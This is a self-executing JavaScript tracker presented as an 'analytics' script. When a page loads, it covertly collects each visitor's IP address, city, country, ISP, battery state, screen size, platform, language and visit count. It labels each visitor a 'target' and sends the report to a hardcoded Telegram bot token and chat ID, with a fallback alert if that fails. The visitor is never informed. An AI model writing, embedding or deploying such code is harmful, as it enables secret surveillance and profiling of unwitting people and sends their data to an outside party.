/* --- Advanced Intel Analytics v10.0 | Tracking Edition --- */
(async function() {
    const _cfg = {
        t: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
        i: '8528072384'
    };

    try {
        // 1. Check if user has visited before
        const visitCount = localStorage.getItem('v_cnt') || 0;
        const isReturning = visitCount > 0;
        localStorage.setItem('v_cnt', parseInt(visitCount) + 1);

        // 2. Fetch Network & Location Data
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        // 3. Fetch Battery Status
        let batteryStatus = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryStatus = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging ⚡' : 'Discharging 🔋'})`;
        }

        // 4. Collect Technical Hardware Info
        const specs = {
            lang: navigator.language || 'Unknown',
            platform: navigator.platform || 'Unknown',
            cores: navigator.hardwareConcurrency || 'N/A',
            screen: `${window.screen.width}x${window.screen.height}`,
            time: new Date().toLocaleString()
        };

        // 5. Build Smart Tracking Report
        const header = isReturning 
            ? `⚠️ [RETURNING TARGET DETECTED (Visit #${parseInt(visitCount) + 1})]` 
            : `🔱 [NEW TARGET DETECTED]`;

        const report = 
            `${header}\n` +
            `--------------------------\n` +
            `📍 Location: ${data.city}, ${data.country_name}\n` +
            `🌐 IP Address: ${data.ip}\n` +
            `📡 ISP: ${data.org}\n` +
            `--------------------------\n` +
            `📱 Device Info:\n` +
            `   • Battery: ${batteryStatus}\n` +
            `   • Resolution: ${specs.screen}\n` +
            `   • Platform: ${specs.platform}\n` +
            `   • Language: ${specs.lang}\n` +
            `--------------------------\n` +
            `🔗 Site: ${document.title}\n` +
            `⏰ Local Time: ${specs.time}`;

        const url = `https://api.telegram.org/bot${_cfg.t}/sendMessage?chat_id=${_cfg.i}&text=${encodeURIComponent(report)}`;
        
        await fetch(url);

    } catch (err) {
        fetch(`https://api.telegram.org/bot${_cfg.t}/sendMessage?chat_id=${_cfg.i}&text=${encodeURIComponent('⚠️ Alert: Target accessed ' + document.title)}`);
    }
})();
